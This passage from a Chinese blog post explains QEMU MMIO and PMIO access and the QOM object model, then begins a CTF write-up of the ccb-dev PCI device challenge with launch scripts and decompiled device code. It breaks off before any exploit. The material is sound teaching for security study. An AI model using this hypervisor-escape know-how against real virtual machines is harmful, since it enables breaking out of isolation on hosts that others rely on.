iomemsize);</span><br></pre></td></tr></table></figure><p>还有一种方式是在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h3><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure><p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><p>有一点要注意的是在访问pmio的时候，是直接通过I&#x2F;O port写入和读取资源的，因此要事先声明port归属，不然有可能会导致冲突，pmio常见用于x86平台上，适用于传统的设备，如：串口，键盘等等</p><table><thead><tr><th align="left"><strong>特性</strong></th><th align="left"><strong>MMIO（ioremap + readl&#x2F;writel）</strong></th><th align="left"><strong>PMIO（inb&#x2F;outb）</strong></th></tr></thead><tbody><tr><td align="left"><strong>访问方式</strong></td><td align="left">内存映射（直接访问物理内存）</td><td align="left">I&#x2F;O 端口（x86 <code>in</code>&#x2F;<code>out</code> 指令）</td></tr><tr><td align="left"><strong>适用架构</strong></td><td align="left">所有架构（x86&#x2F;ARM&#x2F;RISC-V）</td><td align="left">主要是 x86</td></tr><tr><td align="left"><strong>地址范围</strong></td><td align="left">32&#x2F;64 位物理地址</td><td align="left">16 位端口地址（0x0000–0xFFFF）</td></tr><tr><td align="left"><strong>性能</strong></td><td align="left">通常更快（内存访问优化）</td><td align="left">较慢（需要 CPU I&#x2F;O 指令）</td></tr><tr><td align="left"><strong>典型设备</strong></td><td align="left">PCIe 设备、GPU、网卡</td><td align="left">传统 ISA 设备（串口、PS&#x2F;2）</td></tr></tbody></table><h2 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h2><p><code>QEMU</code>提供了一套面向对象编程的模型——<code>QOM</code>（<code>QEMU Object Module</code>），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>由于<code>qemu</code>模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解<code>C++</code>或其它面向对象语言来理解<code>QOM</code>。</p><p>有几个比较关键的结构体，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中<code>ObjectClass</code>、<code>Object</code>、<code>TypeInfo</code>定义在<code>include/qom/object.h</code>中，<code>TypeImpl</code>定义在<code>qom/object.c中</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeInfo</span> &#123;</span><br><span class="line">    <span class="comment">/* 类型标识 */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;          <span class="comment">// 类型名称（唯一标识符，如 &quot;MyDevice&quot;）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;        <span class="comment">// 父类型名称（继承关系，NULL表示无父类）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 实例（对象）相关 */</span></span><br><span class="line">    <span class="type">size_t</span> instance_size;      <span class="comment">// 实例的内存大小（sizeof(MyObject)）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);        <span class="comment">// 实例构造函数（初始化成员变量）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);   <span class="comment">// 实例后置初始化（依赖注入等）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);    <span class="comment">// 实例析构函数（资源释放）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 类（元类型）相关 */</span></span><br><span class="line">    <span class="type">bool</span> abstract;             <span class="comment">// 是否为抽象类型（不可直接实例化）</span></span><br><span class="line">    <span class="type">size_t</span> class_size;         <span class="comment">// 类结构体大小（sizeof(MyClass)）</span></span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);      <span class="comment">// 类构造函数（初始化静态方法）</span></span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data); <span class="comment">// 父类初始化回调</span></span><br><span class="line">    <span class="built_in">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);   <span class="comment">// 类析构函数（清理静态资源）</span></span><br><span class="line">    <span class="type">void</span> *class_data;          <span class="comment">// 类级别的自定义数据（可选）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 接口支持（多继承） */</span></span><br><span class="line">    InterfaceInfo *interfaces; <span class="comment">// 实现的接口列表（如 [Serializable, Drawable]）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>TypeImpl</code>的属性与<code>TypeInfo</code>的属性对应，实际上<code>qemu</code>就是通过用户提供的<code>TypeInfo</code>创建的<code>TypeImpl</code>的对象。</p><p>如下面定义的<code>pci_test_dev</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">    .name          = TYPE_PCI_TEST_DEV,       <span class="comment">// 类型名称（唯一标识）</span></span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,         <span class="comment">// 父类型（继承自PCI设备）</span></span><br><span class="line">    .instance_size = <span class="built_in">sizeof</span>(PCITestDevState), <span class="comment">// 实例内存大小</span></span><br><span class="line">    .class_init    = pci_testdev_class_init,  <span class="comment">// 类初始化函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register</span>(info);  <span class="comment">// 直接调用动态注册函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(info-&gt;parent);  <span class="comment">// 必须指定父类型（强制单继承）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register_internal</span>(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = <span class="built_in">type_new</span>(info);      <span class="comment">// 创建类型对象（TypeImpl）</span></span><br><span class="line">    <span class="built_in">type_table_add</span>(ti);       <span class="comment">// 将类型添加到全局类型表</span></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所有<code>qemu</code>总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中去实例化其对应的<code>ObjectClasses</code>。</p><p>每个<code>type</code>都有一个相应的<code>ObjectClass</code>所对应，其中<code>ObjectClass</code>是所有类的基类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span>  <span class="comment">// 表示以下字段为内部实现细节，外部不应直接访问</span></span><br><span class="line">    Type type;                  <span class="comment">// 指向该类的TypeImpl对象，包含类型名称、父类、实例大小等元信息</span></span><br><span class="line">    GSList *interfaces;         <span class="comment">// 该类实现的所有接口（GSList链表结构，支持多接口继承）</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];  <span class="comment">// 缓存对象类型转换结果（如object_dynamic_cast）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];   <span class="comment">// 缓存类类型转换结果（如class_dynamic_cast）</span></span><br><span class="line">    </span><br><span class="line">    ObjectUnparent *unparent;   <span class="comment">// 当对象从父对象中移除时调用的回调函数</span></span><br><span class="line">    GHashTable *properties;     <span class="comment">// 类的静态属性表（存储通过class_property_add()添加的属性定义）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>type</code>是连接<code>ObjectClass</code>和<code>TypeImpl</code>对象的桥梁</p><p>用户可以定义自己的类，继承相应类即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TypeImpl</span> *Type;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ObjectClass</span> ObjectClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type&#x27;s instance */</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">DeviceClass</span> &#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">PCIDeviceClass</span> &#123;</span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>可以看到类的定义中<strong>父类都在第一个字段</strong>，使得可以父类与子类<strong>直接实现转换</strong>。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会<strong>继承父类相应的虚函数指针</strong>，当所有的父类都<strong>初始化结束后</strong>，<code>TypeInfo::class_init</code>就会<strong>调用</strong>以实现虚函数的初始化，如下例的pci_testdev_class_init所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = <span class="built_in">DEVICE_CLASS</span>(klass);</span><br><span class="line">        PCIDeviceClass *k = <span class="built_in">PCI_DEVICE_CLASS</span>(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;exit = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">&quot;PCI Test Device&quot;</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2025长城杯决赛-ccb-dev"><a href="#2025长城杯决赛-ccb-dev" class="headerlink" title="2025长城杯决赛  ccb-dev"></a>2025长城杯决赛  ccb-dev</h2><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">97b</span>480f126b2:/home/ctf<span class="meta"># cat run.sh \n</span></span><br><span class="line">#!/bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">512</span>M \</span><br><span class="line">    -kernel ./vmlinuz \</span><br><span class="line">    -initrd  ./core.cpio \</span><br><span class="line">    -L pc-bios \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -device ccb-dev-pci \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>看到qemu的启动脚本，有个<code>-device ccb-dev-pci</code>：加载一个 <strong>自定义 PCI 设备</strong></p><p>可以猜测漏洞就在这个pci上，看pci的详细信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># lspci -v</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.0</span> Class <span class="number">0601</span>: <span class="number">8086</span>:<span class="number">7000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">04.0</span> Class <span class="number">00f</span>f: <span class="number">1234</span>:<span class="number">1337</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00.0</span> Class <span class="number">0600</span>: <span class="number">8086</span>:<span class="number">1237</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.3</span> Class <span class="number">0680</span>: <span class="number">8086</span>:<span class="number">7113</span></span><br><span class="line"><span class="number">00</span>:<span class="number">03.0</span> Class <span class="number">0200</span>: <span class="number">8086</span>:<span class="number">100</span>e</span><br><span class="line"><span class="number">00</span>:<span class="number">01.1</span> Class <span class="number">0101</span>: <span class="number">8086</span>:<span class="number">7010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">02.0</span> Class <span class="number">0300</span>: <span class="number">1234</span>:<span class="number">1111</span></span><br></pre></td></tr></table></figure><p>可以看到有两个非标准的厂商和设备id，1234:1337更像是ccb_dev的pci</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/pci0000:<span class="number">00</span>/<span class="number">0000</span>:<span class="number">00</span>:<span class="number">04.0</span> <span class="meta"># hexdump config</span></span><br><span class="line"><span class="number">0000000</span> <span class="number">1234</span> <span class="number">1337</span> <span class="number">0103</span> <span class="number">0000</span> <span class="number">0081</span> <span class="number">00f</span>f <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000010</span> <span class="number">1000</span> febf <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000020</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1</span>af4 <span class="number">1100</span></span><br><span class="line"><span class="number">0000030</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line">*</span><br><span class="line"><span class="number">0000100</span></span><br></pre></td></tr></table></figure><p>这里有个BAR0是MMIO</p><p>逆向<code>qemu</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DeviceClass *dc; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  PCIDeviceClass *pci; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dc = (DeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                        oc,</span><br><span class="line">                        <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                        <span class="number">146</span>,</span><br><span class="line">                        <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci = (PCIDeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                            oc,</span><br><span class="line">                            <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                            <span class="number">147</span>,</span><br><span class="line">                            <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci-&gt;realize = (<span class="built_in">void</span> (*)(PCIDevice *, Error **))ccb_dev_realize;</span><br><span class="line">  pci-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  pci-&gt;device_id = <span class="number">4919</span>;</span><br><span class="line">  pci-&gt;revision = <span class="number">-127</span>;</span><br><span class="line">  pci-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  dc-&gt;desc = <span class="string">&quot;arttnba3 test PCI device&quot;</span>;</span><br><span class="line">  <span class="built_in">set_bit_68</span>(<span class="number">7LL</span>, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致的作用：</p><ul><li>确保当前设备类继承自 QEMU 的通用设备基类 和 确保当前设备类是一个 PCI 设备。</li><li><code>realize</code> 是 QEMU 设备初始化的关键回调，在设备实例化时被调用</li><li>配置 PCI 设备的厂商 ID、设备 ID、版本号和类代码。</li><li>然后 设置设备的描述字符串。</li><li>最后设置 类别掩码 对 设备进行分类，掩码为7</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_realize</span><span class="params">(PCIDevice *pci_dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             &amp;pci_dev-&gt;qdev.parent_obj,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">123</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_realize&quot;</span>);</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(</span><br><span class="line">    &amp;ds_0-&gt;mmio,</span><br><span class="line">    &amp;ds_0-&gt;parent_obj.qdev.parent_obj,</span><br><span class="line">    &amp;ccb_dev_mmio_ops,</span><br><span class="line">    pci_dev,</span><br><span class="line">    <span class="string">&quot;ccb_dev-mmio&quot;</span>,</span><br><span class="line">    <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">pci_register_bar</span>(pci_dev, <span class="number">0</span>, <span class="number">0</span>, &amp;ds_0-&gt;mmio);</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;buffer));</span><br><span class="line">  ds_0-&gt;index = <span class="number">0</span>;</span><br><span class="line">  ds_0-&gt;log_arg = <span class="number">0LL</span>;</span><br><span class="line">  ds_0-&gt;status = <span class="number">0</span>;</span><br><span class="line">  ds_0-&gt;log_fd = <span class="number">2LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;log_format, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;log_format));</span><br><span class="line">  ds_0-&gt;log_handler = (LogHandlerFunc)&amp;dprintf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><strong>MMIO 初始化</strong>：  <ul><li>设备通过 <code>MMIO</code> 与 <code>Guest</code> 交互，大小为 <code>2KB</code>，操作由 <code>ccb_dev_mmio_ops</code> 实现。</li><li>需确保 <code>ccb_dev_mmio_ops</code> 已定义（如 <code>read/write</code> 回调）。</li></ul></li><li><strong>PCI BAR 注册</strong>：  <ul><li><code>Guest</code> 访问 